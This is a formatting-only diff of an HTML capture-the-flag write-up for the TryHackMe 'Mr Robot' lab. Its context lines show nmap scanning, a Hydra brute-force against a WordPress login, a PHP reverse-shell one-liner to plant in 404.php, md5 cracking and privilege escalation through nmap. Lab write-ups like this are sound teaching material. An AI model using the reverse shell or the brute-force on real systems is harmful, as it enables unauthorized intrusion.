@@ -94,11 +94,12 @@ Nmap done: 1 IP address (1 host up) scanned in 23.22 seconds
             <li><strong>-sV</strong> , for service/version info.</li>
             <li>The above command will scan the first 1000 ports.</li>
         </ul>
-        <br>
+        <!-- <br> -->
         <p id="extLink"
-            onclick="window.open('https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html', '_blank')">🕮 Read
-            More - "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"</p>
+            onclick="window.open('https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html', '_blank')">🕮
+            Read More - "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"</p>
         <br>
+
         <p>From the above scan results, we can see that an 'Apache' web server is running and we can access it through
             'port 80 (http) and port 443 (https)'. Also, 'OpenSSH' on port 22.</p>
         <br>
@@ -326,7 +327,8 @@ Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use i
             <li><strong>http-post-form</strong>: Specifies we're attacking a POST form</li>
             <li><strong>/wp-login.php</strong>: Target login page path</li>
             <li><strong>log=^USER^&amp;pwd=^PASS^</strong>: Form parameters where <strong>^USER^</strong> and
-                <strong>^PASS^</strong> are Hydra's injection points</li>
+                <strong>^PASS^</strong> are Hydra's injection points
+            </li>
             <li><strong>F=Invalid username</strong>: Failure string - Hydra knows a attempt failed when this message
                 appears</li>
         </ul>
@@ -402,8 +404,8 @@ Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use i
             </li>
             <br>
             <li><strong>Or,</strong> edit and update the <strong>404.php</strong> with only one liner payload,
-                <strong>php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=&gt;$sock,
-                    1=&gt;$sock, 2=&gt;$sock),$pipes);'</strong>.
+                <span><strong>php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=&gt;$sock,
+                        1=&gt;$sock, 2=&gt;$sock),$pipes);'</strong></span>.
                 Find More - <a
                     href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php"
                     target="_blank">"https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php"</a>.
@@ -429,23 +431,25 @@ Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use i
             Inside <strong>/home/robot</strong> , I got two files to inspect <strong>(check the output below)</strong>.
             For,
             <strong>key-2-of-3.txt</strong> file, only the file owner (<strong>robot</strong>) can read it. But, for
-            <strong>password.raw-md5</strong> file, anyone can read it and only the file owner can write it.</p>
+            <strong>password.raw-md5</strong> file, anyone can read it and only the file owner can write it.
+        </p>
 
         <br>
-        
+
         <p id="extLink"
             onclick="window.open('https://www.redhat.com/en/blog/linux-file-permissions-explained', '_blank')">🕮
             Read More - "https://www.redhat.com/en/blog/linux-file-permissions-explained"</p>
         <br>
 
-        <p id="extLink"
-            onclick="window.open('https://linuxhandbook.com/linux-file-permissions/', '_blank')">🕮 "https://linuxhandbook.com/linux-file-permissions/"</p>
+        <p id="extLink" onclick="window.open('https://linuxhandbook.com/linux-file-permissions/', '_blank')">🕮
+            "https://linuxhandbook.com/linux-file-permissions/"</p>
         <br>
 
         <img alt="Mr Robot" src="../../../assets/images/thmImages/thm-mrrobot-pic13.png" />
 
         <br>
-        <p>Cracking the md5 hash - <a href="https://crackstation.net/" target="_blank">"https://crackstation.net/"</a></p>
+        <p>Cracking the md5 hash - <a href="https://crackstation.net/" target="_blank">"https://crackstation.net/"</a>
+        </p>
         <img alt="Mr Robot pic14" src="../../../assets/images/thmImages/thm-mrrobot-pic14.png" />
 
         <br>
@@ -459,7 +463,8 @@ Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use i
             <li><strong>cd /home/robot</strong> - Changed our working directory</li>
             <li><strong>su robot</strong>, Switch-user / change current user as 'robot' with it's password.</li>
             <li>Finally, <strong>whoami</strong> - verify the username and read the content from key 2 file
-                <strong>(second flag)</strong>.</li>
+                <strong>(second flag)</strong>.
+            </li>
         </ul>
 
 
@@ -487,8 +492,8 @@ Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use i
         </p>
 
         <img alt="Mr Robot pic17" src="../../../assets/images/thmImages/thm-mrrobot-pic17.png" />
-        <p id="extLink"
-            onclick="window.open('https://gtfobins.github.io/gtfobins/nmap/', '_blank')">🕮 Read More - "https://gtfobins.github.io/gtfobins/nmap/"</p>
+        <p id="extLink" onclick="window.open('https://gtfobins.github.io/gtfobins/nmap/', '_blank')">🕮 Read More -
+            "https://gtfobins.github.io/gtfobins/nmap/"</p>
         <br>
 
         <p>From the shell, I tried to execute the commands from GTFOBins and finally got the root shell. Now, we can
